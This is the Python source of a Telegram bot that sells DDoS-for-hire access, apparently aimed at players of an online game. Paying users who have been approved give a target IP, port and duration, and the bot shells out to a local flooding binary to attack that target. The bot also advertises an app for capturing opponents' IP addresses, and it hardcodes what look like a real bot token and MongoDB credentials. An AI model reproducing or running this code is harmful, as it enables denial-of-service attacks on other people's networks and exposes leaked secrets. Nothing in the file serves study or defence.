import os
import signal
import telebot
import json
import requests
import logging
import time
from pymongo import MongoClient
from datetime import datetime, timedelta
import certifi
import random
from threading import Thread
import asyncio
import aiohttp
from telebot import types
import pytz
import psutil

loop = asyncio.new_event_loop()
asyncio.set_event_loop(loop)

TOKEN = '7987530430:AAFFosq9S-ZzjzkzNpIhsTb3WDC2KIWsTDI'
MONGO_URI = 'mongodb+srv://Dangerboyop:FJgjOtOZ2z8kUptY@dangerboyop.nyzgq.mongodb.net/'
FORWARD_CHANNEL_ID = -1002258627494
CHANNEL_ID = -1002258627494
error_channel_id = -1002258627494

logging.basicConfig(
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
    level=logging.INFO)

client = MongoClient(MONGO_URI, tlsCAFile=certifi.where())
db = client['danger']
users_collection = db.users
bot = telebot.TeleBot(TOKEN)
REQUEST_INTERVAL = 1

blocked_ports = [8700, 20000, 443, 17500, 9031, 20002, 20001]


async def start_asyncio_loop():
    while True:
        await asyncio.sleep(REQUEST_INTERVAL)


async def run_attack_command_async(target_ip, target_port, duration):
    try:
        # Start the attack process
        process = await asyncio.create_subprocess_shell(
            f"./soulcracks {target_ip} {target_port} {duration} 400"
        )
        bot.attack_process = process
        await process.communicate()

        # Reset attack state
        bot.attack_in_progress = False
        bot.attack_process = None

        # Notify the attack initiator
        if bot.attack_initiator:
            bot.send_message(
                bot.attack_initiator,
                "*⚔️ Attack Completed! ⚔️*\n"
                "*The battlefield is clear and the results are in.*\n"
                "*🚀 Ready for the next challenge? Keep the momentum going and aim for victory!* 🌟\n"
                "*Let us know if you need further assistance or if you’re ready to dive back in!*",
                reply_markup=create_inline_keyboard(),
                parse_mode='Markdown'
            )
            bot.attack_initiator = None

    except Exception as e:
        logging.error(f"Error in run_attack_command_async: {e}")
        if bot.attack_initiator:
            bot.send_message(
                bot.attack_initiator,
                "*⚠️ Oops! Something went wrong during the attack.*\n"
                "Please check the logs or contact support for assistance.",
                reply_markup=create_inline_keyboard(),
                parse_mode='Markdown'
            )
            bot.attack_initiator = None




def is_user_admin(user_id, chat_id):
    try:
        return bot.get_chat_member(
            chat_id, user_id).status in ['administrator', 'creator']
    except Exception as e:
        logging.error(f"Error checking admin status: {e}")
        return False


def extend_and_clean_expired_users():
    tz = pytz.timezone('Asia/Kolkata')
    now = datetime.now(tz)
    logging.info(f"Current Date and Time: {now}")

    users_cursor = users_collection.find()
    for user in users_cursor:
        user_id = user.get("user_id")
        username = user.get("username", "Unknown User")
        time_approved_str = user.get("time_approved")
        days = user.get("days", 0)
        valid_until_str = user.get("valid_until", "")
        approving_admin_id = user.get("approved_by")

        if valid_until_str:
            try:
                valid_until_date = datetime.strptime(valid_until_str, "%Y-%m-%d").date()
                time_approved = datetime.strptime(time_approved_str, "%I:%M:%S %p %Y-%m-%d").time() if time_approved_str else datetime.min.time()
                valid_until_datetime = datetime.combine(valid_until_date, time_approved)
                valid_until_datetime = tz.localize(valid_until_datetime)

                if now > valid_until_datetime:
                    try:
                        bot.send_message(
                            user_id,
                            f"*⚠️ Access Expired! ⚠️*\n"
                            f"Your access expired on {valid_until_datetime.strftime('%Y-%m-%d %I:%M:%S %p')}.\n"
                            f"🕒 Approval Time: {time_approved_str if time_approved_str else 'N/A'}\n"
                            f"📅 Valid Until: {valid_until_datetime.strftime('%Y-%m-%d %I:%M:%S %p')}\n"
                            f"If you believe this is a mistake or wish to renew your access, please contact support. 💬",
                            reply_markup=create_inline_keyboard(),
                            parse_mode='Markdown'
                        )

                        if approving_admin_id:
                            bot.send_message(
                                approving_admin_id,
                                f"*🔴 User {username} (ID: {user_id}) has been automatically removed due to expired access.*\n"
                                f"🕒 Approval Time: {time_approved_str if time_approved_str else 'N/A'}\n"
                                f"📅 Valid Until: {valid_until_datetime.strftime('%Y-%m-%d %I:%M:%S %p')}\n"
                                f"🚫 Status: Removed*",
                                parse_mode='Markdown'
                            )
                    except Exception as e:
                        logging.error(f"Failed to send message for user {user_id}: {e}")

                    result = users_collection.delete_one({"user_id": user_id})
                    if result.deleted_count > 0:
                        logging.info(f"User {user_id} has been removed from the database. 🗑️")
                    else:
                        logging.warning(f"Failed to remove user {user_id} from the database. ⚠️")
            except ValueError as e:
                logging.error(f"Failed to parse date for user {user_id}: {e}")

    logging.info("Approval times extension and cleanup completed. ✅")



def update_proxy():
    proxy_list = [
        # Add your proxies here
    ]
    proxy = random.choice(proxy_list)
    telebot.apihelper.proxy = {'https': proxy}
    logging.info("Proxy updated successfully.")


@bot.message_handler(commands=['update_proxy'])
def update_proxy_command(message):
    chat_id = message.chat.id
    try:
        update_proxy()
        bot.send_message(chat_id, "*🔄 Proxy updated successfully.*")
    except Exception as e:
        bot.send_message(chat_id, f"*❌ Failed to update proxy: {e}*")


@bot.message_handler(commands=['approve', 'disapprove'])
def approve_or_disapprove_user(message):
    user_id = message.from_user.id
    chat_id = message.chat.id
    is_admin = is_user_admin(user_id, CHANNEL_ID)
    cmd_parts = message.text.split()

    if not is_admin:
        bot.send_message(
            chat_id,
            "🚫 *Access Denied!*\n"
            "❌ *You don't have the required permissions to use this command.*\n"
            "💬 *Please contact the bot owner if you believe this is a mistake.*",
            parse_mode='Markdown')
        return

    if len(cmd_parts) < 2:
        bot.send_message(
            chat_id,
            "⚠️ *Invalid Command Format!*\n"
            "ℹ️ *To approve a user:*\n"
            "`/approve <user_id> <plan> <days>`\n"
            "ℹ️ *To disapprove a user:*\n"
            "`/disapprove <user_id>`\n"
            "🔄 *Example:* `/approve 12345678 1 30`\n"
            "✅ *This command approves the user with ID 12345678 for Plan 1, valid for 30 days.*",
            parse_mode='Markdown')
        return

    action = cmd_parts[0]

    try:
        target_user_id = int(cmd_parts[1])
    except ValueError:
        bot.send_message(chat_id,
                         "⚠️ *Error: [user_id] must be an integer!*\n"
                         "🔢 *Please enter a valid user ID and try again.*",
                         parse_mode='Markdown')
        return

    target_username = message.reply_to_message.from_user.username if message.reply_to_message else None

    try:
        plan = int(cmd_parts[2]) if len(cmd_parts) >= 3 else 0
        days = int(cmd_parts[3]) if len(cmd_parts) >= 4 else 0
    except ValueError:
        bot.send_message(chat_id,
                         "⚠️ *Error: <plan> and <days> must be integers!*\n"
                         "🔢 *Ensure that the plan and days are numerical values and try again.*",
                         parse_mode='Markdown')
        return

    tz = pytz.timezone('Asia/Kolkata')
    now = datetime.now(tz).date()

    if action == '/approve':
        valid_until = (
            now +
            timedelta(days=days)).isoformat() if days > 0 else now.isoformat()
        time_approved = datetime.now(tz).strftime("%I:%M:%S %p %Y-%m-%d")
        users_collection.update_one({"user_id": target_user_id}, {
            "$set": {
                "user_id": target_user_id,
                "username": target_username,
                "plan": plan,
                "days": days,
                "valid_until": valid_until,
                "approved_by": user_id,
                "time_approved": time_approved,
                "access_count": 0
            }
        },
                                    upsert=True)

        # Message to the approving admin
        bot.send_message(
            chat_id,
            f"✅ *Approval Successful!*\n"
            f"👤 *User ID:* `{target_user_id}`\n"
            f"📋 *Plan:* `{plan}`\n"
            f"⏳ *Duration:* `{days} days`\n"
            f"🎉 *The user has been approved and their account is now active.*\n"
            f"🚀 *They will be able to use the bot's commands according to their plan.*",
            parse_mode='Markdown')

        # Message to the target user
        bot.send_message(
            target_user_id,
            f"🎉 *Congratulations, {target_user_id}!*\n"
            f"✅ *Your account has been approved!*\n"
            f"📋 *Plan:* `{plan}`\n"
            f"⏳ *Valid for:* `{days} days`\n"
            f"🔥 *You can now use the /attack command to unleash the full power of your plan.*\n"
            f"💡 *Thank you for choosing our service! If you have any questions, don't hesitate to ask.*",
            reply_markup=create_inline_keyboard(), 
            parse_mode='Markdown')

        # Message to the channel
        bot.send_message(
            CHANNEL_ID,
            f"🔔 *Notification:*\n"
            f"👤 *User ID:* `{target_user_id}`\n"
            f"💬 *Username:* `@{target_username}`\n"
            f"👮 *Has been approved by Admin:* `{user_id}`\n"
            f"🎯 *The user is now authorized to access the bot according to Plan {plan}.*",
            parse_mode='Markdown')

    elif action == '/disapprove':
        users_collection.delete_one({"user_id": target_user_id})
        bot.send_message(
            chat_id,
            f"❌ *Disapproval Successful!*\n"
            f"👤 *User ID:* `{target_user_id}`\n"
            f"🗑️ *The user's account has been disapproved and all related data has been removed from the system.*\n"
            f"🚫 *They will no longer be able to access the bot.*",
            parse_mode='Markdown')

        # Message to the target user
        bot.send_message(
            target_user_id,
            "🚫 *Your account has been disapproved and removed from the system.*\n"
            "💬 *If you believe this is a mistake, please contact the admin.*",
            parse_mode='Markdown')

        # Message to the channel
        bot.send_message(
            CHANNEL_ID,
            f"🔕 *Notification:*\n"
            f"👤 *User ID:* `{target_user_id}`\n"
            f"👮 *Has been disapproved by Admin:* `{user_id}`\n"
            f"🗑️ *The user has been removed from the system.*",
            parse_mode='Markdown')





bot.attack_in_progress = False
bot.attack_duration = 0
bot.attack_start_time = 0
bot.attack_initiator = None

@bot.message_handler(commands=['attack'])
def handle_attack_command(message):
    user_id = message.from_user.id
    chat_id = message.chat.id
    markup = types.InlineKeyboardMarkup()
    button1 = types.InlineKeyboardButton(text="💥 𝗔𝗽𝗽𝗿𝗼𝘃𝗲 𝗡𝗼𝘄 💥", url="https://t.me/drabbyt")
    button2 = types.InlineKeyboardButton(text="💸 𝗣𝗿𝗶𝗰𝗲 𝗟𝗶𝘀𝘁 𝗛𝗲𝗿𝗲 💸", url="https://t.me/drabbyt1/8436")
    markup.add(button1)
    markup.add(button2)

    try:
        user_data = users_collection.find_one({"user_id": user_id})
        if not user_data or user_data.get('plan', 0) == 0:
            bot.send_message(
                chat_id,
                "*🚫 Access Denied! 🚫*\n"
                "*You are not approved to use this bot.*\n"
                "🔒 *Approval required.* Contact the owner [@drabbyt]",
                parse_mode='Markdown',
                reply_markup=markup)
            return

        if bot.attack_in_progress:
            remaining_time = int(bot.attack_duration - (time.time() - bot.attack_start_time))
            bot.send_message(
                chat_id,
                f"*⏳ Hold on! The bot is currently in another attack.*\n"
                f"*⏱️ Remaining Time: {remaining_time} seconds.*\n"
                "*Please wait patiently.*",
                parse_mode='Markdown')
            return

        bot.send_message(
            chat_id,
            "*💣 Ready to launch an attack? 💣*\n"
            "*💻 Provide the target IP, port, and duration in seconds.*\n"
            "*Example: 167.67.25 6296 180 💥*\n"
            "*🎯 Get ready to unleash chaos!*",
            parse_mode='Markdown')
        bot.register_next_step_handler(message, process_attack_command)

    except Exception as e:
        logging.error(f"Error in attack command: {e}")


def process_attack_command(message):
    try:
        args = message.text.split()
        if len(args) != 3:
            bot.send_message(
                message.chat.id,
                "*❌ Error! ❌ Incorrect format.*\n"
                "*Please provide the correct data: Target IP, Target Port, and Duration in Seconds.* 💢",
                parse_mode='Markdown'
            )
            return

        target_ip, target_port, duration = args[0], int(args[1]), int(args[2])

        if target_port in blocked_ports:
            bot.send_message(
                message.chat.id,
                f"*🚫 Port {target_port} is blocked! 🚫*\n"
                "*Select a different port and try again. 💥*",
                parse_mode='Markdown'
            )
            return

        if duration > 600:
            bot.send_message(
                message.chat.id,
                "*⏳ Maximum duration is 600 seconds! ⏳*\n"
                "*Please shorten the duration and try again. 🕒*",
                parse_mode='Markdown'
            )
            return

        bot.attack_in_progress = True
        bot.attack_duration = duration
        bot.attack_start_time = time.time()
        bot.attack_initiator = message.from_user.id

        # Start the attack
        asyncio.run_coroutine_threadsafe(run_attack_command_async(target_ip, target_port, duration), loop)

        response = (
            f"*⚔️ Attack Launched! ⚔️*\n"
            f"*🎯 Target Host: {target_ip}*\n"
            f"*🔗 Target Port: {target_port}*\n"
            f"*⏰ Duration: {duration} seconds*\n"
            "*🔥 Let the chaos begin! 🔥\n"
            "⚡ Inflame the battlefield! ⚡\n"
            "💥 Clear the scene with your hands! 💥\n"
            "🎯 Goal: Clear hits and make a mark! 🎯*"
        )

        markup = types.InlineKeyboardMarkup()
        button3 = types.InlineKeyboardButton(text="💎 𝗝𝗼𝗶𝗻 𝗢𝘂𝗿 𝗖𝗵𝗮𝗻𝗻𝗲𝗹 💎", url="https://t.me/drabhacks")
        stop_button = types.InlineKeyboardButton(text="🛑 𝗦𝗧𝗢𝗣 𝗔𝗧𝗧𝗔𝗖𝗞 🛑", callback_data="stop_attack")
        markup.add(button3)
        markup.add(stop_button)

        bot.send_message(message.chat.id, response, parse_mode='Markdown', reply_markup=markup)

    except Exception as e:
        logging.error(f"Error in processing attack command: {e}")


# Function to create the inline keyboard with the join channel button
def create_inline_keyboard():
    markup = types.InlineKeyboardMarkup()
    button3 = types.InlineKeyboardButton(
        text="❤‍🩹 𝗝𝗼𝗶𝗻 𝗢𝘂𝗿 𝗖𝗵𝗮𝗻𝗻𝗲𝗹 ❤‍🩹", url="https://t.me/drabhacks")
    markup.add(button3)
    return markup

@bot.callback_query_handler(func=lambda call: call.data == "stop_attack")
def handle_stop_attack(call):
    try:
        if bot.attack_in_progress and call.from_user.id == bot.attack_initiator:
            process_stopped = False

            # Iterate over all processes to find and stop the 'bgmi' process
            for proc in psutil.process_iter(['pid', 'name']):
                if 'bgmi' in proc.info['name']:  # Adjust if needed
                    os.kill(proc.info['pid'], signal.SIGINT)
                    process_stopped = True
                    break

            if process_stopped:
                # Reset the bot state
                bot.attack_in_progress = False
                bot.attack_duration = 0
                bot.attack_start_time = 0
                bot.attack_initiator = None

                bot.send_message(
                    call.message.chat.id,
                    "*🛑 Attack Stopped Successfully! 🛑*\n"
                    "🌟 *The battlefield is now clear.* 🌟\n"
                    "💥 *Mission Accomplished!* 💥\n"
                    "🛡️ The attack has been terminated successfully, ensuring that no further impact will occur.\n"
                    "💼 Thank you for keeping control and maintaining order. The bot is now ready for your next command.",
                    parse_mode='Markdown',
                    reply_markup=create_inline_keyboard()
                )
            else:
                bot.send_message(
                    call.message.chat.id,
                    "*🚫 No 'bgmi' process found to stop.*\n"
                    "🔍 It seems that the target process could not be identified, or it might have already been terminated.\n"
                    "📋 Please check the process status and try again if necessary.",
                    parse_mode='Markdown',
                    reply_markup=create_inline_keyboard()
                )
        else:
            bot.send_message(
                call.message.chat.id,
                "*❌ No attack in progress or you are not the initiator.*\n"
                "🗝️ You must be the one who initiated the attack to stop it.\n"
                "🔒 If no attack is in progress, there's nothing to stop.",
                parse_mode='Markdown',
                reply_markup=create_inline_keyboard()
            )
    except Exception as e:
        logging.error(f"Error in stop attack callback: {e}")
        bot.send_message(
            call.message.chat.id,
            "*⚠️ An error occurred while attempting to stop the attack.*\n"
            "💢 Please check the logs or contact the bot administrator for assistance.",
            parse_mode='Markdown',
            reply_markup=create_inline_keyboard()
        )




def start_asyncio_thread():
    asyncio.set_event_loop(loop)
    loop.run_until_complete(start_asyncio_loop())


@bot.message_handler(commands=['myinfo'])
def myinfo_command(message):
    try:
        user_id = message.from_user.id
        user_data = users_collection.find_one({"user_id": user_id})

        # Set timezone and format date/time
        tz = pytz.timezone('Asia/Kolkata')
        now = datetime.now(tz)
        current_date = now.date().strftime("%Y-%m-%d")
        current_time = now.strftime("%I:%M:%S %p")

        if not user_data:
            response = (
                "*⚠️ No account information found. ⚠️*\n"
                "*It looks like you don't have an account with us.*\n"
                "*Please contact the owner for assistance.*\n"
            )
            markup = types.InlineKeyboardMarkup()
            button1 = types.InlineKeyboardButton(text="☣️ 𝗖𝗼𝗻𝘁𝗮𝗰𝘁 𝗢𝘄𝗻𝗲𝗿 ☣️",
                                                 url="https://t.me/drabbyt")
            button2 = types.InlineKeyboardButton(
                text="💸 𝗣𝗿𝗶𝗰𝗲 𝗟𝗶𝘀𝘁 💸", url="https://t.me/drabbyt1/8436")
            markup.add(button1)
            markup.add(button2)
        else:
            username = message.from_user.username or "Unknown User"
            plan = user_data.get('plan', 'N/A')
            valid_until = user_data.get('valid_until', 'N/A')

            response = (
                f"*👤 Username: @{username}*\n"
                f"*💼 Plan: {plan} ₹*\n"
                f"*📅 Valid Until: {valid_until}*\n"
                f"*📆 Current Date: {current_date}*\n"
                f"*🕒 Current Time: {current_time}*\n"
                "*🎉 Thank you for being with us! 🎉*\n"
                "*If you need any help or have questions, feel free to ask.* 💬"
            )
            markup = types.InlineKeyboardMarkup()
            button = types.InlineKeyboardButton(
                text="❤‍🩹 𝗝𝗼𝗶𝗻 𝗢𝘂𝗿 𝗖𝗵𝗮𝗻𝗻𝗲𝗹 ❤‍🩹", url="https://t.me/drabhacks")
            markup.add(button)

        bot.send_message(message.chat.id,
                         response,
                         parse_mode='Markdown',
                         reply_markup=markup)
    except Exception as e:
        logging.error(f"Error handling /myinfo command: {e}")



@bot.message_handler(commands=['rules'])
def rules_command(message):
    rules_text = (
        "*📜 Rules:*\n\n"
        "*1. 🚫 No spamming. Please wait 5-6 matches between attacks.*\n"
        "*2. 🔫 Limit your kills to 30-40.*\n"
        "*3. ⚖️ Play fair. Avoid cheating and reports.*\n"
        "*4. 🛑 No mods or hacked files.*\n"
        "*5. 🤝 Be courteous. Communicate respectfully.*\n"
        "*6. 📩 Report issues to [@drabbyt].*\n\n"
        "*Follow the rules and have fun! 🎉*")
    markup = types.InlineKeyboardMarkup()
    button = types.InlineKeyboardButton(text="☣️ 𝗖𝗼𝗻𝘁𝗮𝗰𝘁 𝗨𝘀 ☣️",
                                        url="https://t.me/drabbyt")
    markup.add(button)
    try:
        bot.send_message(message.chat.id,
                         rules_text,
                         parse_mode='Markdown',
                         reply_markup=markup)
    except Exception as e:
        print(f"Error handling /rules command: {e}")


@bot.message_handler(commands=['help'])
def help_command(message):
    help_text = ("*💥 Welcome to the Ultimate Bot! 💥*\n\n"
                 "*Commands you can use:*\n"
                 "*1. 🚀 /attack - Launch an attack.*\n"
                 "*2. 🔍 /myinfo - Check your details.*\n"
                 "*3. 👑 /owner - Get owner info.*\n"
                 "*4. 📡 /canary - Get the latest version.*\n"
                 "*5. 📜 /rules - Review the rules.*\n\n"
                 "*If you have any questions, just ask! 💬*")
    markup = types.InlineKeyboardMarkup()
    button1 = types.InlineKeyboardButton(text="☣️ 𝗖𝗼𝗻𝘁𝗮𝗰𝘁 𝗨𝘀 ☣️",
                                         url="https://t.me/drabbyt")
    button2 = types.InlineKeyboardButton(text="💸 𝗦𝗲𝗲 𝗣𝗿𝗶𝗰𝗲𝘀 💸",
                                         url="https://t.me/drabbyt1/8436")
    markup.add(button1) 
    markup.add(button2)
    try:
        bot.send_message(message.chat.id,
                         help_text,
                         parse_mode='Markdown',
                         reply_markup=markup)
    except Exception as e:
        print(f"Error handling /help command: {e}")


@bot.message_handler(commands=['owner'])
def owner_command(message):
    response = (
        "*👤 **Owner Information:**\n\n"
        "For any inquiries, support, or collaboration opportunities, don't hesitate to reach out to the owner:\n"
        "📩 **Telegram:** @drabbyt\n"
        "💬 **We value your feedback!** Your thoughts and suggestions are crucial for improving our service and enhancing your experience.\n\n"
        "🌟 **Thank you for being a part of our community!** Your support means the world to us, and we’re always here to help!*\n"
    )
    markup = types.InlineKeyboardMarkup()
    button = types.InlineKeyboardButton(text="☣️ 𝗖𝗼𝗻𝘁𝗮𝗰𝘁 𝗨𝘀 ☣️",
                                        url="https://t.me/drabbyt")
    markup.add(button)
    try:
        bot.send_message(message.chat.id,
                         response,
                         parse_mode='Markdown',
                         reply_markup=markup)
    except Exception as e:
        print(f"Error handling /owner command: {e}")


@bot.message_handler(commands=['start'])
def start_message(message):
    markup = types.InlineKeyboardMarkup()
    
    button3 = types.InlineKeyboardButton(text="💻 𝗝𝗼𝗶𝗻 𝘁𝗵𝗲 𝗛𝗮𝗰𝗸𝗶𝗻𝗴 𝗦𝗾𝘂𝗮𝗱 💻",
                                         url="https://t.me/drabhacks")

    
    markup.add(button3)

    try:
        bot.send_message(message.chat.id, "*🌍 WELCOME TO DDOS WORLD!* 🎉\n\n"
                                           "*🚀 Get ready to dive into the action!*\n\n"
                                           "*💣 To unleash your power, use the* `/attack` *command followed by your target's IP and port.* ⚔️\n\n"
                                           "*🔍 Example: After* `/attack`, *enter:* `ip port duration`.\n\n"
                                           "*🔥 Ensure your target is locked in before you strike!*\n\n"
                                           "*📚 New around here? Check out the* `/help` *command to discover all my capabilities.* 📜\n\n"
                                           "*⚠️ Remember, with great power comes great responsibility! Use it wisely... or let the chaos reign!* 😈💥",
                                           parse_mode='Markdown',reply_markup=markup)
    
    except Exception as e:
        print(f"Error while processing /start command: {e}")


@bot.message_handler(commands=['canary'])
def canary_command(message):
    response = ("*📥 Download the HttpCanary APK Now! 📥*\n\n"
                "*🔍 Track IP addresses with ease and stay ahead of the game! 🔍*\n"
                "*💡 Utilize this powerful tool wisely to gain insights and manage your network effectively. 💡*\n\n"
                "*Choose your platform:*")

    markup = types.InlineKeyboardMarkup()
    button1 = types.InlineKeyboardButton(
        text="📱 𝗗𝗼𝘄𝗻𝗹𝗼𝗮𝗱 𝗙𝗼𝗿 𝗔𝗻𝗱𝗿𝗼𝗶𝗱 📱",
        url="https://t.me/DANGERXVIP_FEEDBACKS/1244")
    button2 = types.InlineKeyboardButton(
        text="🍎 𝗗𝗼𝘄𝗻𝗹𝗼𝗮𝗱 𝗳𝗼𝗿 𝗶𝗢𝗦 🍎",
        url="https://apps.apple.com/in/app/surge-5/id1442620678")

    markup.add(button1)
    markup.add(button2)

    try:
        bot.send_message(message.chat.id,
                         response,
                         parse_mode='Markdown',
                         reply_markup=markup)
    except Exception as e:
        logging.error(f"Error while processing /canary command: {e}")



if __name__ == "__main__":
    asyncio_thread = Thread(target=start_asyncio_thread, daemon=True)
    asyncio_thread.start()
    extend_and_clean_expired_users()
    logging.info("Starting Codespace activity keeper and Telegram bot...")
    while True:
        try:
            bot.polling(none_stop=True)
        except Exception as e:
            logging.error(f"An error occurred while polling: {e}")

        logging.info(
            f"Waiting for {REQUEST_INTERVAL} seconds before the next request..."
        )
        time.sleep(REQUEST_INTERVAL)

    